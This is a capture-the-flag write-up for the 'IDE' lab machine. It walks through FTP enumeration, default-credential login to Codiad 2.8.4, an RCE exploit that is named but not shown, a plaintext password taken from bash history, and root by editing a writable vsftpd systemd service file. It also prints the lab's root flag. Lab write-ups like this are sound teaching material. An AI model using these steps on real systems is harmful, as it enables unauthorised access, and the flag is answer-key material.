---
title: IDE
tags: [room, thm, pacomple]

---

# IDE —  Writeup

---

##  Reconnaissance

**Open ports:**

```
Discovered open port 21/tcp on 10.10.253.53
Discovered open port 22/tcp on 10.10.253.53
Discovered open port 80/tcp on 10.10.253.53
Discovered open port 62337/tcp on 10.10.253.53
```

**Service versions:**

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

---

## FTP Enumeration

Logging into FTP anonymously, navigating to the hidden `...` directory reveals a file named `-`:

```
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
-rw-r--r--    1 0        0             151 Jun 18  2021 -
```

Downloading it:

```bash
ftp> get -
```

Contents:

```
Hey john,
I have reset the password as you have asked. Please use the default password to login.
Also, please take care of the image file ;)
- drac.
```

Testing the default credentials on SSH and FTP didn't work. However, the login page on port **62337** accepted them.

---

##  Web — Codiad 2.8.4

The title of the web application on port 62337 is **Codiad 2.8.4**. A known RCE exploit exists for this version, which gives a shell as `www-data`.

---

## Lateral Movement — User `drac`

Inside `drac`'s home directory, the bash history was readable:

```bash
www-data@ide:/home/drac$ cat .bash_history
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```

The password `Th3dRaCULa1sR3aL` works for SSH login as `drac`.

### User Flag

```bash
cat /home/drac/user.txt
```

---

## Privilege Escalation — Root

Checking sudo permissions:

```bash
drac@ide:~$ sudo -l
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

The `vsftpd.service` file is writable by `drac`:

```
-rw-rw-r-- 1 root drac 248 Aug  4  2021 /lib/systemd/system/vsftpd.service
```

Editing the service file to execute a reverse shell or a privilege escalation payload in the `ExecStart` directive, then reloading the daemon and restarting the service:

```bash
drac@ide:~$ systemctl daemon-reload
drac@ide:~$ sudo /usr/sbin/service vsftpd restart
```

### Root Flag

```bash
cat /root/root.txt
ce258cb16f47f1c66f0b0b77f4e0fb8d
```

---

*Happy hacking! 🎮*